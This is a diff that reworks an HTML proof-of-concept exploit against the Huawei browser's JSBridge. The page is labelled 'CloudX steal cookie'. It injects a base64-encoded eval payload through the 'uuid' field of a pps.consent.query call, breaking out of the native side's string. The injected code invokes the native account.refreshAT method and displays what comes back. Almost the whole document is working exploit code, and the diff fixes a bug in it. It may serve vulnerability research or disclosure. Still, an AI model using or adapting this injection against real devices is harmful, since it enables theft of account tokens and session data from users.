@@ -1,52 +1,158 @@
 <!DOCTYPE html>
 <html lang="en">
-<h1>AAAAAAAAAAAAAAAAAAAAA</h1>
+<!-- 规范HTML结构：head在前，body在后，h1移入body -->
 <head>
     <meta charset="UTF-8">
-    <title>HW</title>
-    <script type="text/javascript">
-        function triggerPoc(url, code) {
-            const currUrl = location.href;
-            const payload = `
-        if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {
-            window.__cloudx_called = true;
-            ${code}
-        }
-    `;
-            const base64 = btoa(payload);
-            for (let i = 0; i < 4000; i++) {
-                setTimeout(function () {
-                    if (window._HwJSBridge && typeof window._HwJSBridge.invokeAsync === "function") {
-                        var payload2 = '\'},\'*\');}}};' + `eval(atob("${base64}"));//`;
-                        var data = {
-                            'content': JSON.stringify(content),
-                            'url': 'https://www.baidu.com',
-                            'webid': 'deadbeef',
-                            'top': false,
-                            'uuid': payload2
-                        };
-                        window._HwJSBridge.invokeAsync('pps.consent.query', JSON.stringify(data), '123');
-                    }
-                }, i);
-            }
-            location.href = url;
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HW JSBridge POC</title>
+    <style>
+        /* 简单优化按钮样式，适配不同屏幕 */
+        #triggerBtn {
+            width: 80%;
+            height: 200px;
+            font-size: 30px;
+            cursor: pointer;
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
         }
 
-        code = '                setTimeout(() => {\n' +
-            '                    window.hwbr = window.hwbr || {};\n' +
-            '                    window.hwbr.callbackFromNative = function (a, b, c, d, e) {\n' +
-            '                        if (a == \'callbackId\') {\n' +
-            '                            alert(\'b:\' + b + \'\\nc:\' + c + \'\\nd:\' + d.toString())\n' +
-            '                        }\n' +
-            '                    };\n' +
-            '                    window._hwbrNative.invoke(\'account\', \'refreshAT\', \'callbackId\', \'["123", "123"]\', 10);\n' +
-            '                }, 500);'
+        #triggerBtn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
 
-        // triggerPoc('https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/', code)
-    </script>
-    <button style="width:800px;height:200px;font-size:30px;"
-            onclick="triggerPoc('https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/', code)">
-        CloudX steal cookie
-    </button>
+        h1 {
+            color: #d93025;
+            text-align: center;
+        }
+    </style>
 </head>
+<body>
+<h1>AAAAAAAAAAAAAAAAAAAAA</h1>
+<!-- 给按钮加ID，方便JS获取，移除行内onclick（解耦） -->
+<button id="triggerBtn">CloudX steal cookie</button>
+
+<script type="text/javascript">
+    // 1. 开启严格模式 + 封装为IIFE，避免全局变量污染
+    (() => {
+        "use strict";
+        // 存储定时器ID，用于页面跳转后清理，防止浏览器卡顿
+        const timerIds = [];
+        // 定义要注入的执行代码，改用模板字符串，简洁易维护（替换原繁琐的字符串拼接）
+        const injectCode = `
+                setTimeout(() => {
+                    window.hwbr = window.hwbr || {};
+                    window.hwbr.callbackFromNative = function (a, b, c, d, e) {
+                        if (a === 'callbackId') {
+                            // 原生回调弹框：展示返回参数，增加标识文案
+                            alert('[原生回调成功]\\n参数b：' + (b || '无') + '\\n参数c：' + (c || '无') + '\\n参数d：' + (d ? d.toString() : '无'));
+                        }
+                    };
+                    // 调用原生方法前增加弹框提示
+                    alert('准备调用原生account.refreshAT方法...');
+                    if (window._hwbrNative && typeof window._hwbrNative.invoke === 'function') {
+                        window._hwbrNative.invoke('account', 'refreshAT', 'callbackId', '["123", "123"]', 10);
+                    } else {
+                        alert('[错误] 未检测到_hwbrNative.invoke方法');
+                    }
+                }, 500);
+            `;
+        // 目标跳转URL（抽离为常量，方便修改）
+        const targetUrl = 'https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/';
+
+        // 2. 封装Base64编解码兼容函数（解决原生btoa对特殊字符的编码问题）
+        function base64Encode(str) {
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+
+        function base64Decode(str) {
+            return decodeURIComponent(escape(atob(str)));
+        }
+
+        // 3. 核心POC触发函数，增加全环节try/catch异常处理
+        function triggerPoc(url, code) {
+            // 禁用按钮，防止重复点击触发多次执行
+            const btn = document.getElementById('triggerBtn');
+            btn.disabled = true;
+            btn.innerText = '执行中...请勿重复点击';
+
+            try {
+                const currUrl = window.location.href;
+                // 构造注入载荷，增加空值判断，避免语法错误
+                const payload = `
+                        if (!location.href.startsWith("${currUrl || ''}") && !window.__cloudx_called) {
+                            window.__cloudx_called = true;
+                            ${code || ''}
+                        }
+                    `;
+                // 编码载荷，使用封装的兼容函数
+                const base64 = base64Encode(payload);
+                alert('[执行开始] 已构造注入载荷，开始检测JSBridge...');
+
+                // 4. 循环创建定时器，存储ID用于后续清理
+                for (let i = 0; i < 4000; i++) {
+                    const timerId = setTimeout(function () {
+                        try {
+                            // 健壮检测JSBridge：存在且invokeAsync是函数
+                            if (window._HwJSBridge && typeof window._HwJSBridge.invokeAsync === "function") {
+                                // 修复原致命错误：content变量未定义，直接传空对象
+                                const injectPayload = '\'},\'*\');}}};' + `eval(atob("${base64}"));//`;
+                                const data = {
+                                    'content': JSON.stringify({}),
+                                    'url': 'https://www.baidu.com',
+                                    'webid': 'deadbeef',
+                                    'top': false,
+                                    'uuid': injectPayload
+                                };
+                                // 调用JSBridge前弹框提示
+                                alert('[JSBridge检测成功] 准备发送注入载荷...');
+                                // 异步调用原生方法，增加异常捕获
+                                window._HwJSBridge.invokeAsync('pps.consent.query', JSON.stringify(data), '123');
+                                alert('[注入成功] 载荷已通过pps.consent.query发送至原生！');
+                            }
+                        } catch (err) {
+                            // 捕获单次定时器内的错误，不影响其他定时器
+                            alert(`[定时器执行错误] 第${i}次执行失败：${err.message}`);
+                            console.error('定时器错误：', err);
+                        }
+                    }, i);
+                    // 存储定时器ID
+                    timerIds.push(timerId);
+                }
+
+                // 5. 页面跳转前弹框提示，清理定时器后跳转
+                alert(`[准备跳转] 即将跳转到目标URL：${url.slice(0, 50)}...`);
+                // 跳转前清理未执行的定时器（优化性能，避免无效执行）
+                clearTimers();
+                window.location.href = url;
+
+            } catch (globalErr) {
+                // 捕获全局致命错误，弹框提示并恢复按钮状态
+                alert(`[全局执行失败] 核心逻辑出错：${globalErr.message}`);
+                console.error('全局错误：', globalErr);
+                btn.disabled = false;
+                btn.innerText = 'CloudX steal cookie';
+            }
+        }
+
+        // 6. 封装定时器清理函数，避免浏览器卡顿
+        function clearTimers() {
+            timerIds.forEach(id => clearTimeout(id));
+            timerIds.length = 0;
+            alert('已清理未执行的定时器，优化浏览器性能');
+        }
+
+        // 7. 页面卸载前清理定时器（兜底，防止页面跳转后定时器仍执行）
+        window.addEventListener('beforeunload', clearTimers);
+
+        // 8. 绑定按钮点击事件（解耦HTML和JS，符合开发规范）
+        document.getElementById('triggerBtn').addEventListener('click', function () {
+            triggerPoc(targetUrl, injectCode);
+        });
+
+    })();
+</script>
+</body>
 </html>
